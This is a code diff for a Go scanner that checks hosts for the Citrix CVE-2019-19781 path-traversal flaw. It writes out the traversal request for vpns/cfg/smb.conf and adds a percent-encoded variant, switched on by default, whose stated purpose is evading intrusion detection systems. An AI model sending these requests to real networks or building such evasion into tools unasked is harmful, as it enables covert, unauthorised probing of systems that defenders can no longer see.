@@ -50,11 +50,15 @@ func main() {
 
 	flag.BoolVar(&verbose, "v", false, "Verbose")
 
+	//ASCII encoding to evade IDS - credit Nick Carr / @ItsReallyNick
+	var evasion bool
+	flag.BoolVar(&evasion, "e", true, "Evade IDS with ASCII encoding") 
+
 	flag.Parse()
 
 	fmt.Println("\nCitrix CVE-2019-19781 Scanner")
 	fmt.Println("Author: robert@x1sec.com")
-	fmt.Println("Version: 0.2\n")
+	fmt.Println("Version: 0.3")
 
 	if networkRange == "" && hostListFile == "" {
 		flag.PrintDefaults()
@@ -73,7 +77,7 @@ func main() {
 			for host := range hosts {
 				atomic.AddUint64(&requestCount, 1)
 				formatFix(&host)
-				if isVulnerable(host, timeout) {
+				if isVulnerable(host, timeout, evasion) {
 					atomic.AddUint64(&vulnCount, 1)
 				}
 			}
@@ -101,9 +105,7 @@ func main() {
 					var delta float64
 					delta = (float64(requests) - prevReqCount) / infoInterval
 
-					
 						fmt.Printf("[\033[93m*\033[0m] INFO: speed: %0.0f req/sec, sent: %d/%d reqs, vulnerable: %d \n", delta, requests, len(hostsList), atomic.LoadUint64(&vulnCount))
-					
 					prevReqCount = float64(requests)
 				}
 
@@ -159,10 +161,16 @@ func formatFix(host *string) {
 }
 
 
-func isVulnerable(host string, timeout int) bool {
+func isVulnerable(host string, timeout int, evasion bool) bool {
 
 	to := time.Duration(timeout) * time.Second
-	url := fmt.Sprintf("%svpn/../vpns/cfg/smb.conf", host)
+
+	var url string
+	if evasion == true {
+		url = fmt.Sprintf("%s/vpn/js/%%2e./.%%2e/%%76pns/cfg/smb.conf", host)
+	} else {
+		url = fmt.Sprintf("%svpn/../vpns/cfg/smb.conf", host)
+	}
 
 	tr := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
